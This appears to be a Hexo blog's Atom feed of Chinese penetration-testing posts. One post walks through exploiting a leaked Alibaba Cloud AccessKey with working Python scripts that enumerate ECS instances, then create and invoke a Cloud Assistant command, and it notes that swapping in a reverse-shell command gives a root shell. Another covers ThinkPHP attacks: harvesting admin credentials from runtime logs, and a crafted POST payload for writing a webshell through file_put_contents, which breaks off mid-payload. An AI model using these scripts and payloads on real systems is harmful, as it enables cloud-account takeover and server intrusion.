<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-09-18T07:20:34.480Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一次有趣的裸聊渗透测试</title>
    <link href="http://yoursite.com/2020/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E8%A3%B8%E8%81%8A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>http://yoursite.com/2020/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E8%A3%B8%E8%81%8A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2020-09-15T16:00:00.000Z</published>
    <updated>2020-09-18T07:20:34.480Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0c17ec77104b023de8e7d55e3c1041e549ab3b96cbe02b7192f024616919f9dd"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>阿里云AccessKey泄露的利用</title>
    <link href="http://yoursite.com/2020/09/01/%E9%98%BF%E9%87%8C%E4%BA%91AccessKey%E6%B3%84%E9%9C%B2%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/09/01/%E9%98%BF%E9%87%8C%E4%BA%91AccessKey%E6%B3%84%E9%9C%B2%E7%9A%84%E5%88%A9%E7%94%A8/</id>
    <published>2020-08-31T16:00:00.000Z</published>
    <updated>2020-09-02T04:08:05.151Z</updated>
    
    <content type="html"><![CDATA[<p>在渗透测试非法网站中，很多站都是在阿里云，亚马逊云搭建的站点。而阿里云AccessKey的泄露根用户权限大可以直接接管ECS，AWS则是有限制的，不是根用户是通过IAM来创建的用户，访问S3，EC2是分了权限控制的。在渗透测试中获取AccessKey的思路：github泄露，apk反编译泄露key，比较低权限的webshell，js文件，fofa查找。</p><h4 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a><strong>工具利用</strong></h4><p>利用<a href="https://github.com/aliyun/oss-browser/blob/master/all-releases.md?spm=a2c63.p38356.879954.6.745223c9XFlufA&file=all-releases.md" target="_blank" rel="noopener">OSS Browser</a> 获取oss上面的数据</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/1.png" loading="lazy"></div><p>利用<a href="https://yun.cloudbility.com/" target="_blank" rel="noopener">行云管家</a>获取云主机列表，行云管家可以重置ECS的密码（千万别这样做）</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/2.png" loading="lazy"></div><h4 id="OpenAPI-Explorer"><a href="#OpenAPI-Explorer" class="headerlink" title="OpenAPI Explorer"></a><strong>OpenAPI Explorer</strong></h4><p>python导入模块(python2的环境)</p><pre><code>pip install oss2pip install aliyun-python-sdk-ecs </code></pre><ol><li>利用DescribeInstances获取某个区域的云主机列表（DescribeInstances.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/3.png" alt="" loading="lazy"></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeInstancesRequest <span class="token keyword">import</span> DescribeInstancesRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'&lt;accessKeyId>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;accessSecret>'</span><span class="token punctuation">,</span> <span class="token string">'cn-shanghai'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> DescribeInstancesRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>脚本会输出该区域的公网内网IP，主机名称，InstanceId等等。批量获取所以区域的主机信息(主机名称，操作系统，内网IP，公网IP，区域，InstanceId)，InstanceId在后面的命令执行需要。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> json<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeInstancesRequest <span class="token keyword">import</span> DescribeInstancesRequestRegionIdes <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'华东1（杭州）'</span><span class="token punctuation">:</span><span class="token string">'cn-hangzhou'</span><span class="token punctuation">,</span>    <span class="token string">'华东2（上海）'</span><span class="token punctuation">:</span><span class="token string">'cn-shanghai'</span><span class="token punctuation">,</span>    <span class="token string">'华东 2 金融云'</span><span class="token punctuation">:</span><span class="token string">'cn-shanghai-finance-1'</span><span class="token punctuation">,</span>    <span class="token string">'华北1（青岛）'</span><span class="token punctuation">:</span><span class="token string">'cn-qingdao'</span><span class="token punctuation">,</span>    <span class="token string">'华北2（北京）'</span><span class="token punctuation">:</span><span class="token string">'cn-beijing'</span><span class="token punctuation">,</span>    <span class="token string">'华北3（张家口）'</span><span class="token punctuation">:</span><span class="token string">'cn-zhangjiakou'</span><span class="token punctuation">,</span>    <span class="token string">'华北5（呼和浩特）'</span><span class="token punctuation">:</span><span class="token string">'cn-huhehaote'</span><span class="token punctuation">,</span>    <span class="token string">'华北6（乌兰察布 ）'</span><span class="token punctuation">:</span><span class="token string">'cn-wulanchabu'</span><span class="token punctuation">,</span>    <span class="token string">'华北 2 阿里政务云1'</span><span class="token punctuation">:</span><span class="token string">'cn-north-2-gov-1'</span><span class="token punctuation">,</span>    <span class="token string">'华南1（深圳）'</span><span class="token punctuation">:</span><span class="token string">'cn-shenzhen'</span><span class="token punctuation">,</span>    <span class="token string">'华南 1 金融云'</span><span class="token punctuation">:</span><span class="token string">'cn-shenzhen-finance-1'</span><span class="token punctuation">,</span>    <span class="token string">'华南2（河源）'</span><span class="token punctuation">:</span><span class="token string">'cn-heyuan'</span><span class="token punctuation">,</span>    <span class="token string">'西南1（成都）'</span><span class="token punctuation">:</span><span class="token string">'cn-chengdu'</span><span class="token punctuation">,</span>    <span class="token string">'中国（香港）'</span><span class="token punctuation">:</span><span class="token string">'cn-hongkong'</span><span class="token punctuation">,</span>    <span class="token string">'新加坡'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-1'</span><span class="token punctuation">,</span>    <span class="token string">'澳大利亚（悉尼）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-2'</span><span class="token punctuation">,</span>    <span class="token string">'马来西亚（吉隆坡）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-3'</span><span class="token punctuation">,</span>    <span class="token string">'印度尼西亚（雅加达）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-5'</span><span class="token punctuation">,</span>    <span class="token string">'日本（东京）'</span><span class="token punctuation">:</span><span class="token string">'ap-northeast-1'</span><span class="token punctuation">,</span>    <span class="token string">'印度（孟买）'</span><span class="token punctuation">:</span><span class="token string">'ap-south-1'</span><span class="token punctuation">,</span>    <span class="token string">'德国（法兰克福）'</span><span class="token punctuation">:</span><span class="token string">'eu-central-1'</span><span class="token punctuation">,</span>    <span class="token string">'英国（伦敦）'</span><span class="token punctuation">:</span><span class="token string">'eu-west-1'</span><span class="token punctuation">,</span>    <span class="token string">'美国（硅谷）'</span><span class="token punctuation">:</span><span class="token string">'us-west-1'</span><span class="token punctuation">,</span>    <span class="token string">'美国（弗吉尼亚）'</span><span class="token punctuation">:</span><span class="token string">'us-east-1'</span><span class="token punctuation">,</span>    <span class="token string">'阿联酋（迪拜）'</span><span class="token punctuation">:</span><span class="token string">'me-east-1'</span><span class="token punctuation">}</span><span class="token keyword">for</span> RegionId <span class="token keyword">in</span> RegionIdes<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 填入AccessKey ID 和 AccessKey Secret </span>    client <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxxxx'</span><span class="token punctuation">,</span> RegionIdes<span class="token punctuation">[</span>RegionId<span class="token punctuation">]</span><span class="token punctuation">)</span>    request <span class="token operator">=</span> DescribeInstancesRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>    request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    response <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'Instances'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">for</span> Instance <span class="token keyword">in</span> response<span class="token punctuation">[</span><span class="token string">'Instances'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'VpcAttributes'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                priip <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'VpcAttributes'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'PrivateIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'IpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>            priip <span class="token operator">=</span> <span class="token string">'无'</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'PublicIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                pubip <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'PublicIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'IpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>                pubip <span class="token operator">=</span> <span class="token string">'无'</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceName'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            insname <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'OSName'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            osname <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'OSName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceId'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            insId <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceId'</span><span class="token punctuation">]</span>        res <span class="token operator">=</span> <span class="token string">'主机名称:{}&lt;--->操作系统:{}&lt;--->内网IP:{}&lt;--->公网IP:{}&lt;--->网络@{}&lt;--->InstanceId:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>insname<span class="token punctuation">,</span> osname<span class="token punctuation">,</span>str<span class="token punctuation">(</span>priip<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>pubip<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>RegionId<span class="token punctuation">)</span><span class="token punctuation">,</span>insId<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/4.png" alt="" loading="lazy"></p><ol start="2"><li>使用CreateCommand新建一条云助手命令（CreateCommand.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/5.png" alt="" loading="lazy"></p><p>RegionId代表区域；Name为命令名称，支持全字符集，长度不得超过128个字符；</p><p>Type为命令的类型：</p><pre><code>RunBatScript：创建一个在Windows实例中运行的 Bat 脚本。 RunPowerShellScript：创建一个在Windows实例中运行的PowerShell脚本。 RunShellScript：创建一个在Linux实例中运行的Shell脚本。</code></pre><p>CommandContent为需要执行的命令，base64进行传输的，一般不超过16k</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> base64<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>CreateCommandRequest <span class="token keyword">import</span> CreateCommandRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxxnxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> CreateCommandRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_Name<span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_Type<span class="token punctuation">(</span><span class="token string">"RunShellScript"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandContent<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">'需要执行的命令'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>执行脚本输出</p><pre><code>{&quot;RequestId&quot;:&quot;C5A79885-6377-4785-86C6-9CA7FCXXXXX&quot;,&quot;CommandId&quot;:&quot;c-hz0xxxx&quot;}</code></pre><ol start="3"><li>利用DescribeCommands查询您已经创建的云助手命令（DescribeCommands.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/6.png" alt="" loading="lazy"></p><p>CommandId为CreateCommand脚本执行返回的结果</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeCommandsRequest <span class="token keyword">import</span> DescribeCommandsRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'&lt;accessKeyId>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;accessSecret>'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> DescribeCommandsRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandId<span class="token punctuation">(</span><span class="token string">"c-hz0xxxxx"</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># python2:  print(response) </span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ol start="4"><li>利用InvokeCommand为一台或多台ECS实例触发一条云助手命令（InvokeCommand.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/7.png" alt="" loading="lazy"></p><p>CommandId为CreateCommand脚本执行返回的结果，InstanceId为需要执行命令的实例列表，就是上面第一个脚本获取到的InstanceId</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>InvokeCommandRequest <span class="token keyword">import</span> InvokeCommandRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> InvokeCommandRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandId<span class="token punctuation">(</span><span class="token string">"c-hz0uxxxxx"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_InstanceIds<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"i-bp1xxxxxxx"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>只需要将CreateCommand.py脚本的命令换成反弹shell的命令，在利用InvokeCommand执行命令就可以反弹一个最高权限的shell。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在渗透测试非法网站中，很多站都是在阿里云，亚马逊云搭建的站点。而阿里云AccessKey的泄露根用户权限大可以直接接管ECS，AWS则是有限制的，不是根用户是通过IAM来创建的用户，访问S3，EC2是分了权限控制的。在渗透测试中获取AccessKey的思路：github泄露
      
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>关于ThinkPHP的一些渗透方式</title>
    <link href="http://yoursite.com/2020/08/17/%E5%85%B3%E4%BA%8EThinkPHP%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F/"/>
    <id>http://yoursite.com/2020/08/17/%E5%85%B3%E4%BA%8EThinkPHP%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F/</id>
    <published>2020-08-16T16:00:00.000Z</published>
    <updated>2020-08-17T09:29:35.804Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Runtime日志"><a href="#Runtime日志" class="headerlink" title="Runtime日志"></a><strong>Runtime日志</strong></h4><p>在ThinkPHP3的版本中，入口文件index.php是跟应用目录，框架目录是同一个目录下的，在DEBUG开启的状态下，会在runtime生成日志文件，会泄露一些管理员登录后台的账号密码等。tp3的日志文件命名规则为：根目录(或者应用目录)/Runtime/Logs/Admin/20_08_17.log（年份前2位_月份_日.log）</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/1.png" alt="" loading="lazy"></p><p>在tp5的版本中，入口文件index是在public的目录下，它跟应用目录，框架目录不在同一个目录，但是有些管理员会将入口文件放置到跟应用目录，框架目录同目录，tp5的命名规则为：./runtime/log/202008/17.log（./runtime/log/年月/日.log）</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/2.png" alt="" loading="lazy"></p><h4 id="file-put-contents函数"><a href="#file-put-contents函数" class="headerlink" title="file_put_contents函数"></a><strong>file_put_contents函数</strong></h4><p>在thinkphp3中，后台有很多时候都会有写入配置文件来getshell的，所以我总是喜欢全局查找这个file_put_contents这个函数，然后我在网上找了个代码–yershop(TP3开发的那个版本)来进行审计，后台可以通过写入文件来拿shell。全局查找file_put_contents函数，发现控制器AddonsController.class.php中的build存在</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/4.png" alt="" loading="lazy"></p><p>发现存在两处写入文件，这里第一处需要满足以下条件：</p><pre><code>$addon_dir可控,$data可控,$addonModel可控</code></pre><p>第二处需要满足：</p><pre><code>$data[&#39;has_config&#39;] == 1,$addon_dir可控</code></pre><p>跟踪发现$data是从全局POST获取的，所有可控，即$addon_dir可控</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/5.png" alt="" loading="lazy"></p><p>构造payload如下，后台创建扩展</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/6.png" alt="" loading="lazy"></p><p>点击确定，抓包，首先会判断标识名这个插件是否存在，不存在就执行build访问</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/7.png" alt="" loading="lazy"></p><p>由于要写入config.php这个文件需要满足$data[‘has_config’] == 1，最后构造payload</p><p>访问：index.php?s=/Admin/Addons/build.html              POST发送：</p><pre><code>info%5Bname%5D=Example&amp;info%5Btitle%5D=%E7%A4%BA%E5%88%97&amp;info%5Bversion%5D=0.1&amp;info%5Bauthor%5D=%E6%97%A0%E5%90%8D&amp;info%5Bdescription%5D=%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%B4%E6%97%B6%E6%8F%8F%E8%BF%B0&amp;info%5Bstatus%5D=1&amp;config=%3C%3Fphp%0D%0Areturn+array(%0D%0A%09&#39;random&#39;%3D%3Earray(%2F%2F%E9%85%8D%E7%BD%AE%E5%9C%A8%E8%A1%A8%E5%8D%95%E4%B8%AD%E7%9A%84%E9%94%AE%E5%90%8D+%2C%E8%BF%99%E4%B8%AA%E4%BC%9A%E6%98%AFconfig%5Brandom%5D%0D%0A%09%09&#39;title&#39;%3D%3E&#39;%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AF%E9%9A%8F%E6%9C%BA%3A&#39;%2C%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E6%96%87%E5%AD%97%0D%0A%09%09&#39;type&#39;%3D%3E&#39;radio&#39;%2C%09%09+%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E7%B1%BB%E5%9E%8B%EF%BC%9Atext%E3%80%81textarea%E3%80%81checkbox%E3%80%81radio%E3%80%81select%E7%AD%89%0D%0A%09%09&#39;options&#39;%3D%3Earray(%09%09+%2F%2Fselect+%E5%92%8Cradion%E3%80%81checkbox%E7%9A%84%E5%AD%90%E9%80%89%E9%A1%B9%0D%0A%09%09%09&#39;1&#39;%3D%3E&#39;%E5%BC%80%E5%90%AF&#39;%2C%09%09+%2F%2F%E5%80%BC%3D%3E%E6%96%87%E5%AD%97%0D%0A%09%09%09&#39;0&#39;%3D%3E&#39;%E5%85%B3%E9%97%AD&#39;%2C%0D%0A%09%09)%2C%0D%0A%09%09&#39;value&#39;%3D%3E&#39;1&#39;%2C%09%09%09+%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E9%BB%98%E8%AE%A4%E5%80%BC%0D%0A%09)%2C%0D%0A)%3B%0D%0A%09%09%09%09%09&amp;custom_config=&amp;admin_list=&#39;model&#39;%3D%3E&#39;Example&#39;%2C%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E8%A1%A8%0D%0A%09%09%09&#39;fields&#39;%3D%3E&#39;*&#39;%2C%09%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E5%AD%97%E6%AE%B5%0D%0A%09%09%09&#39;map&#39;%3D%3E&#39;&#39;%2C%09%09%09%09%2F%2F%E6%9F%A5%E8%AF%A2%E6%9D%A1%E4%BB%B6%2C+%E5%A6%82%E6%9E%9C%E9%9C%80%E8%A6%81%E5%8F%AF%E4%BB%A5%E5%86%8D%E6%8F%92%E4%BB%B6%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E9%87%8C%E5%8A%A8%E6%80%81%E9%87%8D%E7%BD%AE%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%0D%0A%09%09%09&#39;order&#39;%3D%3E&#39;id+desc&#39;%2C%09%09%2F%2F%E6%8E%92%E5%BA%8F%2C%0D%0A%09%09%09&#39;list_grid&#39;%3D%3Earray(+%09%09%2F%2F%E8%BF%99%E9%87%8C%E5%AE%9A%E4%B9%89%E7%9A%84%E6%98%AF%E9%99%A4%E4%BA%86id%E5%BA%8F%E5%8F%B7%E5%A4%96%E7%9A%84%E8%A1%A8%E6%A0%BC%E9%87%8C%E5%AD%97%E6%AE%B5%E6%98%BE%E7%A4%BA%E7%9A%84%E8%A1%A8%E5%A4%B4%E5%90%8D%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%B8%80%E6%A0%B7%E6%94%AF%E6%8C%81%E5%87%BD%E6%95%B0%E5%92%8C%E9%93%BE%E6%8E%A5%0D%0A++++++++++++++++&#39;cover_id%7Cpreview_pic%3A%E5%B0%81%E9%9D%A2&#39;%2C%0D%0A++++++++++++++++&#39;title%3A%E4%B9%A6%E5%90%8D&#39;%2C%0D%0A++++++++++++++++&#39;description%3A%E6%8F%8F%E8%BF%B0&#39;%2C%0D%0A++++++++++++++++&#39;link_id%7Cget_link%3A%E5%A4%96%E9%93%BE&#39;%2C%0D%0A++++++++++++++++&#39;update_time%7Ctime_format%3A%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4&#39;%2C%0D%0A++++++++++++++++&#39;id%3A%E6%93%8D%E4%BD%9C%3A%5BEDIT%5D%7C%E7%BC%96%E8%BE%91%2C%5BDELETE%5D%7C%E5%88%A0%E9%99%A4&#39;%0D%0A++++++++++++)%2C%0D%0A%09%09%09%09%09&amp;custom_adminlist=&amp;has_config=1&amp;config=&lt;?php 